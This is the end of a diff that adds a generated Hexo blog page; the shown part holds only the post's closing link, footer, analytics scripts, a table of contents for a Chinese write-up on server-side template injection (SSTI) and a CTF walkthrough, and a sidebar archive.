+<li><p><a href="https://www.cnblogs.com/mke2fs/p/11573786.html" target="_blank" rel="noopener">https://www.cnblogs.com/mke2fs/p/11573786.html</a></p>
+</li>
+</ul>
+</blockquote>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/03/22/Bugku/" title= "Bugku Web 部分题解">
+                    <div class="prevTitle">Bugku Web 部分题解</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:mark765111@aliyun.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/MarkIlV" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.zhihu.com/people/bing-huo-7651" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 丝蒜孝  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158093315-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158093315-1');
+</script>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一、SSTI（Server-Side-Template-Injection）原理"><span class="toc-number">1.</span> <span class="toc-text">一、SSTI（Server-Side Template Injection）原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#二、模板注入漏洞挖掘"><span class="toc-number">1.1.</span> <span class="toc-text">二、模板注入漏洞挖掘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-检测阶段"><span class="toc-number">1.2.</span> <span class="toc-text">1.检测阶段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-识别阶段"><span class="toc-number">1.3.</span> <span class="toc-text">2.识别阶段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-利用阶段"><span class="toc-number">1.4.</span> <span class="toc-text">3.利用阶段</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#三、通过一道CTF题来实践"><span class="toc-number">2.</span> <span class="toc-text">三、通过一道CTF题来实践</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#附：检测模板注入的工具"><span class="toc-number">3.</span> <span class="toc-text">附：检测模板注入的工具</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 4
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2020/03/24/%E6%B5%85%E6%9E%90SSTI%EF%BC%88%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89%E6%BC%8F%E6%B4%9E/" >浅析SSTI（服务端模板注入）漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/22</span><a class="archive-post-title" href= "/2020/03/22/Bugku/" >Bugku Web 部分题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/22</span><a class="archive-post-title" href= "/2020/03/22/VsCode_Theme/" >从头开始设计自己的vscode主题插件</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/22</span><a class="archive-post-title" href= "/2020/03/22/CVE-2019-1338%E5%A4%8D%E7%8E%B0/" >CVE-2019-1338 Windows 证书对话框提权</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="vscode"><span class="iconfont-archer">&#xe606;</span>vscode</span>
+    
+        <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞复现"><span class="iconfont-archer">&#xe606;</span>漏洞复现</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Writeup"><span class="iconfont-archer">&#xe60a;</span>Writeup</span>
+    
+        <span class="sidebar-category-name" data-categories="Misc"><span class="iconfont-archer">&#xe60a;</span>Misc</span>
+    
+        <span class="sidebar-category-name" data-categories="漏洞复现"><span class="iconfont-archer">&#xe60a;</span>漏洞复现</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
